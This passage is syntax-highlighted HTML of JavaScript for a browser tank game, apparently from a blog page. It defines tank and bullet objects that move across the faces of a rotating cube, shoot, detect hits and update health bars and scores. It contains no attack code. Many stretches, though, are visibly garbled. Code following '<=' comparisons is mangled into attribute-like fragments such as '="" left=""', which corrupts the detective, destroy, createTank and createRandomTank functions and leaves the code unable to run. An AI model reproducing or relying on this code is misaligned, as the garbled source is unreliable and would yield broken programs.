document.createElement(<span class="string">&quot;span&quot;</span>);</span><br><span class="line"></span><br><span class="line">        gun.setAttribute(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;gun&quot;</span>);</span><br><span class="line">        tank.setAttribute(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;tank&quot;</span>);</span><br><span class="line">        circle.setAttribute(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;circle&quot;</span>);</span><br><span class="line">        tank.setAttribute(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;tank&quot;</span> + <span class="keyword">this</span>.tankId);</span><br><span class="line"></span><br><span class="line">        gun.style.borderColor = <span class="keyword">this</span>.color;</span><br><span class="line">        circle.style.borderColor = <span class="keyword">this</span>.color;</span><br><span class="line">        tank.style.cssText = <span class="string">&quot;width:&quot;</span> + <span class="keyword">this</span>.width + <span class="string">&quot;px;height:&quot;</span> + <span class="keyword">this</span>.height +</span><br><span class="line">                             <span class="string">&quot;px;top:&quot;</span> + <span class="keyword">this</span>.cy + <span class="string">&quot;px;left:&quot;</span> + <span class="keyword">this</span>.cx + <span class="string">&quot;px;border-color:&quot;</span></span><br><span class="line">                             + <span class="keyword">this</span>.color;</span><br><span class="line"></span><br><span class="line">        tank.appendChild(gun);</span><br><span class="line">        tank.appendChild(circle);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.container.getElementsByTagName(<span class="string">&quot;div&quot;</span>)[<span class="number">0</span>].appendChild(tank);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.tank = tank;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> tank;</span><br><span class="line">    &#125;,</span><br><span class="line">    switchPainter: function(N)&#123;</span><br><span class="line">        <span class="comment">//N  1-&gt;up 2-&gt;right 3-&gt;down 4-&gt;down</span></span><br><span class="line">        <span class="keyword">this</span>.ay %= <span class="number">360</span>;</span><br><span class="line">        <span class="keyword">var</span> r = <span class="literal">false</span>,</span><br><span class="line">            a = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.ay &gt; <span class="number">180</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.ay -= <span class="number">360</span>;</span><br><span class="line">            r = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.ay &lt; -<span class="number">180</span>) <span class="keyword">this</span>.ay += <span class="number">360</span>;</span><br><span class="line">        <span class="keyword">this</span>.container = datas[<span class="keyword">this</span>.dataset[N]];</span><br><span class="line">        <span class="keyword">this</span>.dataset   = <span class="keyword">this</span>.container.getAttribute(<span class="string">&#x27;data-num&#x27;</span>).split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.container.getElementsByTagName(<span class="string">&quot;div&quot;</span>)[<span class="number">0</span>].appendChild(<span class="keyword">this</span>.tank);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.belong &gt;= <span class="number">2</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        box.style.cssText = <span class="string">&quot;-webkit-transform: rotateY(&quot;</span> + (<span class="keyword">this</span>.ay + (r ? -a : a)) + <span class="string">&quot;deg);&quot;</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    setAngle: function(x, y, ang)&#123;</span><br><span class="line">        <span class="keyword">this</span>.sx = x;</span><br><span class="line">        <span class="keyword">this</span>.sy = y;</span><br><span class="line">        <span class="keyword">this</span>.gunAngle = <span class="number">90</span> - ang / Math.PI * <span class="number">180</span>;</span><br><span class="line">        $(<span class="string">&quot;#tank&quot;</span> + <span class="keyword">this</span>.tankId)[<span class="number">0</span>].style.cssText += <span class="string">&quot;-webkit-transform: rotate(&quot;</span> + <span class="keyword">this</span>.gunAngle + <span class="string">&quot;deg);&quot;</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    move: function(ang)&#123;</span><br><span class="line">        <span class="keyword">this</span>.setAngle(Math.cos(ang), -Math.sin(ang), ang);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.stopAni();</span><br><span class="line">        <span class="keyword">this</span>.ani();</span><br><span class="line">    &#125;,</span><br><span class="line">    direction_debug: function()&#123;</span><br><span class="line">        switch(event.keyCode) &#123;</span><br><span class="line">            case <span class="keyword">this</span>.keySet[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;left&quot;</span>;</span><br><span class="line">            case <span class="keyword">this</span>.keySet[<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;up&quot;</span>;</span><br><span class="line">            case <span class="keyword">this</span>.keySet[<span class="number">2</span>]:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;right&quot;</span>;</span><br><span class="line">            case <span class="keyword">this</span>.keySet[<span class="number">3</span>]:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;down&quot;</span>;</span><br><span class="line">            case <span class="keyword">this</span>.keySet[<span class="number">4</span>]:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;shooter&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    move_debug: function()&#123;</span><br><span class="line">        <span class="keyword">this</span>.stopAni();</span><br><span class="line">        switch(<span class="keyword">this</span>.direction_debug()) &#123;</span><br><span class="line">            case <span class="string">&quot;up&quot;</span>:</span><br><span class="line">                console.log(<span class="string">&quot;up&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.setAngle(<span class="number">0</span>, -<span class="number">1</span>, Math.PI / <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">this</span>.gunAngle_debug = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            case <span class="string">&quot;down&quot;</span>:</span><br><span class="line">                console.log(<span class="string">&quot;down&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.setAngle(<span class="number">0</span>, <span class="number">1</span>, Math.PI / <span class="number">2</span> * <span class="number">3</span>);</span><br><span class="line">                <span class="keyword">this</span>.gunAngle_debug = <span class="number">180</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            case <span class="string">&quot;left&quot;</span>:</span><br><span class="line">                console.log(<span class="string">&quot;left&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.setAngle(-<span class="number">1</span>, <span class="number">0</span>, Math.PI);</span><br><span class="line">                <span class="keyword">this</span>.gunAngle_debug = <span class="number">90</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            case <span class="string">&quot;right&quot;</span>:</span><br><span class="line">                console.log(<span class="string">&quot;right&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.setAngle(<span class="number">1</span>, <span class="number">0</span>, Math.PI * <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">this</span>.gunAngle_debug = -<span class="number">90</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            case <span class="string">&quot;shooter&quot;</span>:</span><br><span class="line">                console.log(<span class="string">&quot;shooter&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.shooter();</span><br><span class="line">            default:</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.ani();</span><br><span class="line">    &#125;,</span><br><span class="line">    ani: function()&#123;</span><br><span class="line">        <span class="keyword">var</span> this_ = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">this</span>.timer = setInterval(function()&#123;</span><br><span class="line">            this_.detective();</span><br><span class="line">            <span class="comment">// this_.detectiveTank();  </span></span><br><span class="line"></span><br><span class="line">            this_.cx += this_.sx * this_.speed;</span><br><span class="line">            this_.cy += this_.sy * this_.speed;</span><br><span class="line"></span><br><span class="line">            this_.detective();</span><br><span class="line"></span><br><span class="line">            this_.tank.style.top = this_.cy + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">            this_.tank.style.left = this_.cx + <span class="string">&quot;px&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;, <span class="keyword">this</span>.gap);</span><br><span class="line">    &#125;,</span><br><span class="line">    stopAni: function()&#123;</span><br><span class="line">        <span class="keyword">var</span> event = document.createEvent(<span class="string">&#x27;HTMLEvents&#x27;</span>);</span><br><span class="line">        event.initEvent(<span class="keyword">this</span>.stopN, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">    　　event.eventName = <span class="keyword">this</span>.stopN;</span><br><span class="line">        window.dispatchEvent(event);</span><br><span class="line">    &#125;,</span><br><span class="line">    detective: function()&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.cx - <span class="keyword">this</span>.width &gt;= cSize)&#123;  <span class="comment">//right</span></span><br><span class="line">            <span class="keyword">this</span>.ay += -<span class="number">90</span>;</span><br><span class="line">            <span class="keyword">this</span>.ax += <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">this</span>.switchPainter(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">this</span>.cx = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.cx + <span class="keyword">this</span>.width &lt;= <span class="number">0</span>)&#123;=<span class="string">&quot;&quot;</span> left=<span class="string">&quot;&quot;</span> <span class="keyword">this</span>.ay=<span class="string">&quot;&quot;</span> +=<span class="string">&quot;90;&quot;</span> <span class="keyword">this</span>.ax=<span class="string">&quot;&quot;</span> <span class="keyword">this</span>.switchpainter(<span class="number">3</span>);=<span class="string">&quot;&quot;</span> <span class="keyword">this</span>.cx=<span class="string">&quot;cSize&quot;</span> <span class="keyword">this</span>.width=<span class="string">&quot;&quot;</span> -=<span class="string">&quot;&quot;</span> <span class="number">1</span>;=<span class="string">&quot;&quot;</span> &#125;=<span class="string">&quot;&quot;</span> <span class="keyword">if</span>(<span class="keyword">this</span>.cy=<span class="string">&quot;&quot;</span> &lt;=<span class="string">&quot;0)&#123;&quot;</span> top=<span class="string">&quot;&quot;</span> <span class="keyword">this</span>.sy=<span class="string">&quot;0;&quot;</span> <span class="keyword">this</span>.cy=<span class="string">&quot;4;&quot;</span>&gt;= cSize)&#123;  <span class="comment">//bottom</span></span><br><span class="line">            <span class="keyword">this</span>.sy = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">this</span>.cy = cSize - <span class="keyword">this</span>.width - <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    detectiveTank: function()&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.cx - <span class="keyword">this</span>.width &gt;= cSize)&#123;  <span class="comment">//right</span></span><br><span class="line">            <span class="keyword">this</span>.ay += -<span class="number">90</span>;</span><br><span class="line">            <span class="keyword">this</span>.ax += <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">this</span>.switchPainter(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">this</span>.cx = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.cx + <span class="keyword">this</span>.width &lt;= <span class="number">0</span>)&#123;=<span class="string">&quot;&quot;</span> left=<span class="string">&quot;&quot;</span> <span class="keyword">this</span>.ay=<span class="string">&quot;&quot;</span> +=<span class="string">&quot;90;&quot;</span> <span class="keyword">this</span>.ax=<span class="string">&quot;&quot;</span> <span class="keyword">this</span>.switchpainter(<span class="number">3</span>);=<span class="string">&quot;&quot;</span> <span class="keyword">this</span>.cx=<span class="string">&quot;cSize&quot;</span> <span class="keyword">this</span>.width=<span class="string">&quot;&quot;</span> -=<span class="string">&quot;&quot;</span> <span class="number">1</span>;=<span class="string">&quot;&quot;</span> &#125;=<span class="string">&quot;&quot;</span> <span class="keyword">if</span>(<span class="keyword">this</span>.cy=<span class="string">&quot;&quot;</span> &lt;=<span class="string">&quot;0)&#123;&quot;</span> top=<span class="string">&quot;&quot;</span> <span class="keyword">this</span>.sy=<span class="string">&quot;0;&quot;</span> <span class="keyword">this</span>.cy=<span class="string">&quot;4;&quot;</span>&gt;= cSize)&#123;  <span class="comment">//bottom</span></span><br><span class="line">            <span class="keyword">this</span>.sy = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">this</span>.cy = cSize - <span class="keyword">this</span>.width - <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    shooter: function()&#123;</span><br><span class="line">        <span class="keyword">if</span>((new Date()).getTime() - <span class="keyword">this</span>.sTime &lt; <span class="keyword">this</span>.timerLimit) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">var</span> bullet = new Bullet(<span class="keyword">this</span>.gunAngle, <span class="keyword">this</span>.cx, <span class="keyword">this</span>.cy, <span class="keyword">this</span>.tankId);</span><br><span class="line">        <span class="keyword">this</span>.container.getElementsByTagName(<span class="string">&quot;div&quot;</span>)[<span class="number">0</span>].appendChild(bullet.bullet);</span><br><span class="line">        bullet.move();</span><br><span class="line">        <span class="keyword">this</span>.sTime = (new Date()).getTime();</span><br><span class="line">    &#125;,</span><br><span class="line">    destroy: function()&#123;</span><br><span class="line">        <span class="keyword">this</span>.stopAni();</span><br><span class="line">        <span class="keyword">this</span>.shooterTimer &amp;&amp; clearInterval(<span class="keyword">this</span>.shooterTimer);</span><br><span class="line">        <span class="keyword">this</span>.moveTimer &amp;&amp; clearInterval(<span class="keyword">this</span>.moveTimer);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.tankId &gt;= <span class="number">2</span> &amp;&amp; randomTank &lt;= <span class="number">180</span>=<span class="string">&quot;&quot;</span> tanklimit)=<span class="string">&quot;&quot;</span> createrandomtank();=<span class="string">&quot;&quot;</span> delete=<span class="string">&quot;&quot;</span> tanks[<span class="keyword">this</span>.tankid];=<span class="string">&quot;&quot;</span> <span class="keyword">this</span>.tank.parentnode=<span class="string">&quot;&quot;</span> &amp;&amp;=<span class="string">&quot;&quot;</span> <span class="keyword">this</span>.tank.parentnode.removechild(<span class="keyword">this</span>.tank);=<span class="string">&quot;&quot;</span> <span class="keyword">this</span>;=<span class="string">&quot;&quot;</span> &#125;=<span class="string">&quot;&quot;</span> **=<span class="string">&quot;&quot;</span> *=<span class="string">&quot;&quot;</span> <span class="meta">@bullet</span>=<span class="string">&quot;&quot;</span> tank=<span class="string">&quot;&quot;</span> <span class="meta">@attrs</span>=<span class="string">&quot;&quot;</span> bullet,=<span class="string">&quot;&quot;</span> timer,=<span class="string">&quot;&quot;</span> gap,=<span class="string">&quot;&quot;</span> x,=<span class="string">&quot;&quot;</span> yadsjsw=<span class="string">&quot;&quot;</span> <span class="keyword">var</span>=<span class="string">&quot;&quot;</span> bullet=<span class="string">&quot;function(gA,&quot;</span> y,=<span class="string">&quot;&quot;</span> tankid)&#123;=<span class="string">&quot;&quot;</span> <span class="keyword">this</span>.bullet=<span class="string">&quot;document.createElement(&quot;</span>span<span class="string">&quot;);&quot;</span> <span class="keyword">this</span>.timer=<span class="string">&quot;null;&quot;</span> <span class="keyword">this</span>.gap=<span class="string">&quot;30;&quot;</span> <span class="keyword">this</span>.passed=<span class="string">&quot;0;&quot;</span> a=<span class="string">&quot;Math.cos(gA&quot;</span> math.pi=<span class="string">&quot;&quot;</span> -=<span class="string">&quot;&quot;</span> <span class="number">2</span>),=<span class="string">&quot;&quot;</span> b=<span class="string">&quot;Math.sin(gA&quot;</span> <span class="number">2</span>);=<span class="string">&quot;&quot;</span> <span class="keyword">if</span>(math.abs(a)=<span class="string">&quot;&quot;</span>&gt; <span class="number">1</span>) a = a &gt; <span class="number">0</span> ? Math.floor(a) : Math.ceil(a);</span><br><span class="line">    <span class="keyword">if</span>(Math.abs(b) &gt; <span class="number">1</span>) b = b &gt; <span class="number">0</span> ? Math.floor(b) : Math.ceil(b);</span><br><span class="line">    <span class="keyword">this</span>.a = a;</span><br><span class="line">    <span class="keyword">this</span>.b = b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.x = x + <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">this</span>.y = y + <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">this</span>.bullet.setAttribute(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;bullet&quot;</span>);</span><br><span class="line">    <span class="keyword">this</span>.bullet.style.top = -<span class="number">10</span> + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">    <span class="keyword">this</span>.bullet.style.left = -<span class="number">10</span> + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">    <span class="keyword">this</span>.bullet.style.borderColor = tanks[tankId].bColor;</span><br><span class="line">    <span class="keyword">this</span>.tankId = tankId;</span><br><span class="line">    <span class="keyword">this</span>.container = $(<span class="string">&quot;#tank&quot;</span> + <span class="keyword">this</span>.tankId)[<span class="number">0</span>].parentNode.parentNode;</span><br><span class="line">    <span class="keyword">this</span>.belong = tanks[<span class="keyword">this</span>.tankId].belong;</span><br><span class="line">&#125;</span><br><span class="line">Bullet.prototype = &#123;</span><br><span class="line">    bSwitchPainter: function(N)&#123;</span><br><span class="line">        <span class="keyword">this</span>.container = <span class="keyword">this</span>.bullet.parentNode.parentNode;</span><br><span class="line">        <span class="keyword">this</span>.dataset   = <span class="keyword">this</span>.container.getAttribute(<span class="string">&#x27;data-num&#x27;</span>).split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.container = datas[<span class="keyword">this</span>.dataset[N]];</span><br><span class="line">        <span class="keyword">this</span>.dataset   = <span class="keyword">this</span>.container.getAttribute(<span class="string">&#x27;data-num&#x27;</span>).split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.container.getElementsByTagName(<span class="string">&quot;div&quot;</span>)[<span class="number">0</span>].appendChild(<span class="keyword">this</span>.bullet);</span><br><span class="line">        <span class="keyword">this</span>.passed++;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.passed == <span class="number">4</span>)&#123;</span><br><span class="line">            <span class="keyword">this</span>.destroy();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    detective: function()&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.x - <span class="number">2</span> &gt;= cSize)&#123;      <span class="comment">//right</span></span><br><span class="line">            <span class="keyword">this</span>.bSwitchPainter(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">this</span>.x = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.y - <span class="number">2</span> &gt;= cSize)&#123;      <span class="comment">//bottom</span></span><br><span class="line">            <span class="keyword">this</span>.destroy();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.x + <span class="number">2</span> &lt;= <span class="number">2</span>=<span class="string">&quot;&quot;</span> <span class="number">0</span>)&#123;=<span class="string">&quot;&quot;</span> left=<span class="string">&quot;&quot;</span> <span class="keyword">this</span>.bswitchpainter(<span class="number">3</span>);=<span class="string">&quot;&quot;</span> <span class="keyword">this</span>.x=<span class="string">&quot;cSize&quot;</span> +=<span class="string">&quot;&quot;</span> <span class="number">3</span>;=<span class="string">&quot;&quot;</span> &#125;=<span class="string">&quot;&quot;</span> <span class="keyword">if</span>(<span class="keyword">this</span>.y=<span class="string">&quot;&quot;</span> &lt;=<span class="string">&quot;0)&#123;&quot;</span> top=<span class="string">&quot;&quot;</span> <span class="keyword">this</span>.destroy();=<span class="string">&quot;&quot;</span> &#125;,=<span class="string">&quot;&quot;</span> move:=<span class="string">&quot;&quot;</span> function()&#123;=<span class="string">&quot;&quot;</span> <span class="keyword">var</span>=<span class="string">&quot;&quot;</span> this_=<span class="string">&quot;this;&quot;</span> <span class="keyword">this</span>.timer=<span class="string">&quot;setInterval(function()&#123;&quot;</span> this_.detective();=<span class="string">&quot;&quot;</span> this_.x=<span class="string">&quot;&quot;</span> *=<span class="string">&quot;&quot;</span> <span class="number">5</span>;=<span class="string">&quot;&quot;</span> this_.y=<span class="string">&quot;&quot;</span> this_.checkhit();=<span class="string">&quot;&quot;</span> this_.bullet.style.top=<span class="string">&quot;this_.y&quot;</span> <span class="string">&quot;px&quot;</span>;=<span class="string">&quot;&quot;</span> this_.bullet.style.left=<span class="string">&quot;this_.x&quot;</span> <span class="keyword">this</span>.gap);=<span class="string">&quot;&quot;</span> checkhit:=<span class="string">&quot;&quot;</span> <span class="keyword">for</span>=<span class="string">&quot;&quot;</span> (<span class="keyword">var</span>=<span class="string">&quot;&quot;</span> i=<span class="string">&quot;&quot;</span> <span class="keyword">in</span>=<span class="string">&quot;&quot;</span> tanks)=<span class="string">&quot;&quot;</span> &#123;=<span class="string">&quot;&quot;</span> <span class="keyword">if</span>=<span class="string">&quot;&quot;</span> (i=<span class="string">&quot;=&quot;</span> <span class="keyword">this</span>.tankid)=<span class="string">&quot;&quot;</span> <span class="keyword">continue</span>;=<span class="string">&quot;&quot;</span> (tanks[i].belong=<span class="string">&quot;=&quot;</span> <span class="keyword">this</span>.belong)=<span class="string">&quot;&quot;</span> tx=<span class="string">&quot;tanks[i].cx,&quot;</span> ty=<span class="string">&quot;tanks[i].cy,&quot;</span> bc=<span class="string">&quot;this.container.getAttribute(&quot;</span><span class="keyword">data</span>-v<span class="string">&quot;),&quot;</span> tc=<span class="string">&quot;tanks[i].container.getAttribute(&quot;</span><span class="keyword">data</span>-v<span class="string">&quot;),&quot;</span> w=<span class="string">&quot;14;&quot;</span> ((bc=<span class="string">&quot;=&quot;</span> tc)=<span class="string">&quot;&quot;</span> &amp;&amp;=<span class="string">&quot;&quot;</span> (<span class="keyword">this</span>.x=<span class="string">&quot;&quot;</span> w)=<span class="string">&quot;&quot;</span>&gt; tx - w) &amp;&amp; (<span class="keyword">this</span>.y &lt; ty + w) &amp;&amp; (<span class="keyword">this</span>.y &gt; ty - w) ) &#123;</span><br><span class="line">                console.log(i, tanks[i].life);</span><br><span class="line">                <span class="keyword">this</span>.hit(tanks[i]);</span><br><span class="line">                <span class="keyword">this</span>.destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    hit: function(tTank)&#123;</span><br><span class="line">        tTank.life -= <span class="number">20</span>;</span><br><span class="line">        <span class="keyword">if</span>(tTank.belong == <span class="number">0</span>)&#123;</span><br><span class="line">            console.log(<span class="string">&quot;1掉血&quot;</span>);</span><br><span class="line">            bloodA.style.bottom = <span class="number">300</span> * tTank.life / <span class="number">100</span> + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(tTank.life == <span class="number">0</span>)&#123;</span><br><span class="line">                setTimeout(function()&#123;</span><br><span class="line">                    $(<span class="string">&quot;.pujieL&quot;</span>)[<span class="number">0</span>].style.display = <span class="string">&quot;block&quot;</span>;</span><br><span class="line">                &#125;, <span class="number">2000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(tTank.belong == <span class="number">1</span>)&#123;</span><br><span class="line">            console.log(<span class="string">&quot;2掉血&quot;</span>);</span><br><span class="line">            bloodB.style.bottom = <span class="number">300</span> * tTank.life / <span class="number">100</span> + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(tTank.life == <span class="number">0</span>)&#123;</span><br><span class="line">                setTimeout(function()&#123;</span><br><span class="line">                    $(<span class="string">&quot;.pujieR&quot;</span>)[<span class="number">0</span>].style.display = <span class="string">&quot;block&quot;</span>;</span><br><span class="line">                &#125;, <span class="number">2000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> add = <span class="number">5</span>;</span><br><span class="line">            <span class="keyword">if</span>(tanks[<span class="keyword">this</span>.tankId].belong == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(tTank.life == <span class="number">0</span>)&#123;</span><br><span class="line">                    add = <span class="number">20</span>;</span><br><span class="line">                    <span class="comment">//window.addTankGrade(0);</span></span><br><span class="line">                &#125;</span><br><span class="line">                tanks[<span class="keyword">this</span>.tankId].grade += add;</span><br><span class="line">                $(<span class="string">&quot;#gradeA&quot;</span>)[<span class="number">0</span>].innerHTML = tanks[<span class="keyword">this</span>.tankId].grade;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(tTank.life == <span class="number">0</span>)&#123;</span><br><span class="line">                    add = <span class="number">20</span>;</span><br><span class="line">                    <span class="comment">//window.addTankGrade(1);</span></span><br><span class="line">                &#125;</span><br><span class="line">                tanks[<span class="keyword">this</span>.tankId].grade += add;</span><br><span class="line">                $(<span class="string">&quot;#gradeB&quot;</span>)[<span class="number">0</span>].innerHTML = tanks[<span class="keyword">this</span>.tankId].grade;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(tTank.life &lt;= <span class="number">0</span>)&#123;=<span class="string">&quot;&quot;</span> ttank.destroy();=<span class="string">&quot;&quot;</span> console.log(<span class="string">&quot;destroyed&quot;</span>);=<span class="string">&quot;&quot;</span> &#125;=<span class="string">&quot;&quot;</span> &#125;,=<span class="string">&quot;&quot;</span> destroy:=<span class="string">&quot;&quot;</span> function()&#123;=<span class="string">&quot;&quot;</span> clearinterval(<span class="keyword">this</span>.timer);=<span class="string">&quot;&quot;</span> <span class="keyword">if</span>=<span class="string">&quot;&quot;</span> (typeof=<span class="string">&quot;&quot;</span> tanks[<span class="keyword">this</span>.tankid]=<span class="string">&quot;&quot;</span> !=<span class="string">&quot;undefined&quot;</span> )=<span class="string">&quot;&quot;</span> &#123;=<span class="string">&quot;&quot;</span> <span class="keyword">var</span>=<span class="string">&quot;&quot;</span> tankarr=<span class="string">&quot;tanks[this.tankId].bulletBox;&quot;</span> tankarr.splice(tankarr.indexof(<span class="keyword">this</span>),<span class="number">1</span>);=<span class="string">&quot;&quot;</span> <span class="keyword">this</span>.bullet.parentnode=<span class="string">&quot;&quot;</span> &amp;&amp;=<span class="string">&quot;&quot;</span> <span class="keyword">this</span>.bullet.parentnode.removechild(<span class="keyword">this</span>.bullet);=<span class="string">&quot;&quot;</span> *=<span class="string">&quot;&quot;</span> function=<span class="string">&quot;&quot;</span> createtank(color)&#123;=<span class="string">&quot;&quot;</span> tank=<span class="string">&quot;document.createElement(&quot;</span>span<span class="string">&quot;);&quot;</span> circle=<span class="string">&quot;document.createElement(&quot;</span>span<span class="string">&quot;);&quot;</span> gun=<span class="string">&quot;document.createElement(&quot;</span>span<span class="string">&quot;);&quot;</span> gun.setattribute(<span class="string">&quot;class&quot;</span>,=<span class="string">&quot;&quot;</span> <span class="string">&quot;gun&quot;</span>);=<span class="string">&quot;&quot;</span> tank.setattribute(<span class="string">&quot;class&quot;</span>,=<span class="string">&quot;&quot;</span> <span class="string">&quot;tank&quot;</span>);=<span class="string">&quot;&quot;</span> circle.setattribute(<span class="string">&quot;class&quot;</span>,=<span class="string">&quot;&quot;</span> <span class="string">&quot;circle&quot;</span>);=<span class="string">&quot;&quot;</span> gun.style.bordercolor=<span class="string">&quot;color;&quot;</span> circle.style.bordercolor=<span class="string">&quot;color;&quot;</span> tank.style.csstext=<span class="string">&quot;width:14px;height:18px;position:relative;border-color:&quot;</span> +=<span class="string">&quot;&quot;</span> color;=<span class="string">&quot;&quot;</span> tank.appendchild(gun);=<span class="string">&quot;&quot;</span> tank.appendchild(circle);=<span class="string">&quot;&quot;</span> <span class="keyword">return</span>=<span class="string">&quot;&quot;</span> tank;=<span class="string">&quot;&quot;</span> addtankgrade(n)&#123;=<span class="string">&quot;&quot;</span> box,=<span class="string">&quot;&quot;</span> color,=<span class="string">&quot;&quot;</span> <span class="keyword">if</span>(n=<span class="string">&quot;=&quot;</span> <span class="number">0</span>)=<span class="string">&quot;&quot;</span> box=<span class="string">&quot;$(&quot;</span>#tankBoxA<span class="string">&quot;)[0];&quot;</span> color=<span class="string">&quot;#8500FF&quot;</span> ;=<span class="string">&quot;&quot;</span> &#125;<span class="keyword">else</span>&#123;=<span class="string">&quot;&quot;</span> box.appendchild(tank);=<span class="string">&quot;&quot;</span> createrandomtank(obj)=<span class="string">&quot;&quot;</span> obj=<span class="string">&quot;obj&quot;</span> ||=<span class="string">&quot;&quot;</span> &#123;cx:=<span class="string">&quot;&quot;</span> <span class="number">150</span>,=<span class="string">&quot;&quot;</span> cy:=<span class="string">&quot;&quot;</span> color:<span class="string">&quot;#ecff0b&quot;</span>,=<span class="string">&quot;&quot;</span> bcolor:<span class="string">&quot;#ecff0b&quot;</span>,=<span class="string">&quot;&quot;</span> speed:=<span class="string">&quot;&quot;</span> <span class="number">1</span>,=<span class="string">&quot;&quot;</span> container:=<span class="string">&quot;&quot;</span> backf&#125;;=<span class="string">&quot;&quot;</span> rtank=<span class="string">&quot;new&quot;</span> tank(obj);=<span class="string">&quot;&quot;</span> rtank.<span class="keyword">init</span>(string(randomtank));=<span class="string">&quot;&quot;</span> rtank.shootertimer=<span class="string">&quot;null;&quot;</span> <span class="keyword">if</span>(math.random()=<span class="string">&quot;&quot;</span>&gt; <span class="number">0.8</span>)&#123;</span><br><span class="line">            rTank.shooter();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">    rTank.moveTimer = <span class="literal">null</span>;</span><br><span class="line">    rTank.moveTimer = setInterval(function()&#123;</span><br><span class="line">        <span class="keyword">if</span>(Math.random() &gt; <span 